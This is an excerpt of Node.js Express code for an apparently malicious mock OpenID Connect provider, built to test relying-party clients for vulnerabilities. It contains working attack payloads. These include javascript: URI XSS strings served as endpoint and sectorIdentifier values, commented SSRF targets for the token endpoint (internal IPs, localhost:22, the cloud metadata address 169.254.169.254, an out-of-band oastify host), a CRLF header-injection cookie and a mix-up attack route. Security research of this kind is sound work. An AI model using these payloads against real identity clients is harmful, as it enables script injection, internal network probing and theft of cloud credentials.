...
const useJWTLib = false; // set to false to explore id_token validation (crypto-wise)
...
const path_prefix = "";
const host = "https://abcdef.ngrok-free.app";
//// endpoints - add "127.0.0.1 poc.local" to your /etc/hosts file!
const authEndpoint = `${host}${path_prefix}/auth`;
// Test case: XSS
// const authEndpoint = `javascript://lhq.at/%0aconfirm(document.domain)`;
const tokenEndpoint = `${host}${path_prefix}/token`;
// Test case: SSRF
//const tokenEndpoint = `https://abcdef.oastify.com`; // extern
//const tokenEndpoint = `https://10.1.1.1`;                 // Intern non-existent 
//const tokenEndpoint = `https://127.0.0.1:22`;             // intern localhost
//const tokenEndpoint = `https://169.254.169.254`;          // intern cloud metadata
const userinfoEndpoint = `${host}${path_prefix}/userinfo`;
//const introspectionEndpoint = `${host}${path_prefix}/introspection`; // we use the userinfo instead for our mockup
const jwksEndpoint = `${host}${path_prefix}/.well-known/jwks.json`;
...
const sectorIdentifierUriEndpint = `${host}${path_prefix}/sectorIdentifier`;
...
//const code = "code_abcde\x0d\x0a\x00\u250d\u250a\x0a\x0a\u3f0d\u3f0a\u0000a";
...
let configurationResponse = {"issuer": iss, "authorization_endpoint": authEndpoint, "token_endpoint": tokenEndpoint, "userinfo_endpoint": userinfoEndpoint, "introspection_endpoint": userinfoEndpoint, "jwks_uri": jwksEndpoint, "registration_endpoint": registrationEndpoint, "response_types_supported": ["code", "token id_token"], "subject_types_supported": ["public", "pairwise"], "id_token_signing_alg_values_supported": ["RS256"]};
// Test case: XSS
// let configurationResponse = {"issuer": iss, "authorization_endpoint": authEndpoint, "token_endpoint": tokenEndpoint, "userinfo_endpoint": userinfoEndpoint, "introspection_endpoint": userinfoEndpoint, "jwks_uri": jwksEndpoint, "registration_endpoint": registrationEndpoint, "response_types_supported": ["token id_token"], "subject_types_supported": ["public", "pairwise"], "id_token_signing_alg_values_supported": ["RS256"],"response_modes_supported":["web_message"]};
let sectorIdentifierResponse = ["javascript://lhq.at/%0aalert(document.domain)","javascripT:alert(document.domain)","javascripT://lhq.at/%0aalert(document.domain)"]
...
app.get(path_prefix+"/mixup", function (req, res) {
  ...
  let benignIdP = "https://abcdef.ngrok.io/auth/realms/master/protocol/openid-connect/auth"; // Todo: Adjust!
...
app.get(path_prefix+"/.well-known/openid-configuration", function (req, res) {
  ...
  res.cookie('X-Lauritz-Test', 'test\r\ntest:test')
  res.json(configurationResponse);
});

// sectorIdentifier endpoint
app.get(path_prefix+"/sectorIdentifier", function (req, res) {
  console.log(`\n  [${req.ip}] sectorIdentifierUri endpoint`);
  if(!req.connection.encrypted) console.log('\x1b[41m\x1b[37mUNENCRYPTED CONNECTION!\x1b[0m');
  console.log("      [+] Request headers:");
  console.dir(req.headers);
  console.log(`      [*] Data to be sent: ${JSON.stringify(sectorIdentifierResponse)}`);
  
  res.json(sectorIdentifierResponse);
});
...
// Hint: Can be used to simply obtain a JWT id_token, e.g. for debugging purposes or manual flows
...
// jwks endpoint
app.get(path_prefix+"/.well-known/jwks.json", function (req, res) {
